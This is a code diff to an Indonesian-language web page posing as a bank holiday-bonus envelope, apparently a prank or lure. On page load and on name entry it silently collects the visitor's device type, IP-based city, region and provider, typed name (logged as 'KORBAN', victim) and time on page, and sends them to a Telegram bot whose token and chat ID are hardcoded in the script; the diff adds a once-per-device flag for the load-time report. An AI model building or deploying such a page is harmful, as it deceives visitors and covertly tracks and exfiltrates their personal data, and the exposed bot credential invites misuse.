@@ -38,11 +38,12 @@
         <p id="status-text" style="margin-top: 20px; font-weight: bold; color: #15803d;">Menghubungkan ke server bank...</p>
     </div>
 
-    <div id="prank-screen" onclick="location.reload()">
+    <div id="prank-screen" onclick="closePrank()">
         <img src="monyet-memberikan-jari-tengah-kepada-orang-orang.jpg">
     </div>
 
     <script>
+        // VERSION 1.0 - STABLE
         const env = document.getElementById('envelope');
         const nameInput = document.getElementById('victim-name');
         const loading = document.getElementById('loading-overlay');
@@ -55,28 +56,31 @@
         const TELE_TOKEN = '8642591827:AAEW79QE8FGYcvELtapkI2jnhvXocW4rd9U'; 
         const TELE_ID = '7267912519'; 
 
-        // MULAI ITUNG WAKTU PAS HALAMAN DIBUKA
         const startTime = Date.now();
 
+        // --- ANTI-SPAM PERMANENT (RECENT APPS SAFE) ---
         window.onload = async () => {
-            const ua = navigator.userAgent;
-            let os = /android/i.test(ua) ? "Android" : (/iPhone|iPad|iPod/i.test(ua) ? "iOS" : "PC");
-            let lok = "Sedang mencari...";
-            
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                lok = `${d.city}, ${d.region} (${d.org})`;
-            } catch (e) { lok = "AdBlock Aktif"; }
+            if (!localStorage.getItem('thr_user_logged')) {
+                const ua = navigator.userAgent;
+                let os = /android/i.test(ua) ? "Android" : (/iPhone|iPad|iPod/i.test(ua) ? "iOS" : "PC");
+                let lok = "Mencari lokasi...";
+                
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    const d = await res.json();
+                    lok = `${d.city}, ${d.region} (${d.org})`;
+                } catch (e) { lok = "AdBlock/VPN Aktif"; }
 
-            const teksMasuk = `👀 ADA YANG INTIP LINK!\n📱 OS: ${os}\n📍 LOKASI: ${lok}\n⏰ JAM: ${new Date().toLocaleTimeString()}`;
-            fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_ID}&text=${encodeURIComponent(teksMasuk)}`, { mode: 'no-cors' });
+                const teksMasuk = `👀 ADA YANG INTIP LINK!\n📱 OS: ${os}\n📍 LOKASI: ${lok}\n⏰ JAM: ${new Date().toLocaleTimeString()}`;
+                fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_ID}&text=${encodeURIComponent(teksMasuk)}`, { mode: 'no-cors' });
+                
+                // Tandai HP ini biar gak kirim notif intip lagi selamanya
+                localStorage.setItem('thr_user_logged', 'true');
+            }
         };
 
         async function kirimLog(nama) {
-            // HITUNG DURASI STAY (DETIK)
             const duration = Math.floor((Date.now() - startTime) / 1000);
-            
             const ua = navigator.userAgent;
             let os = /android/i.test(ua) ? "Android" : (/iPhone|iPad|iPod/i.test(ua) ? "iOS" : "PC");
             let lok = "Unknown";
@@ -85,7 +89,7 @@
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
                 lok = `${d.city}, ${d.region} (${d.org})`;
-            } catch (e) { lok = "AdBlock Aktif"; }
+            } catch (e) { lok = "AdBlock/VPN Aktif"; }
 
             const teks = `🎯 KORBAN: ${nama}\n📱 OS: ${os}\n📍 LOKASI: ${lok}\n⏳ STAY: ${duration} Detik\n⏰ JAM: ${new Date().toLocaleTimeString()}`;
             fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_ID}&text=${encodeURIComponent(teks)}`, { mode: 'no-cors' });
@@ -94,10 +98,11 @@
         env.addEventListener('click', () => {
             const nama = nameInput.value.trim();
             if (nama === "") {
-                alert("Isi nama dulu bos!");
+                alert("Woi, isi nama dulu buat cairin saldo!");
                 return;
             }
 
+            // FULLSCREEN & AUDIO TRIGGER
             const elem = document.documentElement;
             if (elem.requestFullscreen) elem.requestFullscreen();
             else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
@@ -117,6 +122,15 @@
                 if (navigator.vibrate) navigator.vibrate([500, 100, 500]);
             }, 5500);
         });
+
+        function closePrank() {
+            prank.style.display = 'none';
+            prankSound.pause();
+            prankSound.currentTime = 0;
+            nameInput.value = "";
+            if (document.exitFullscreen) document.exitFullscreen();
+            else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
+        }
     </script>
 </body>
 </html>
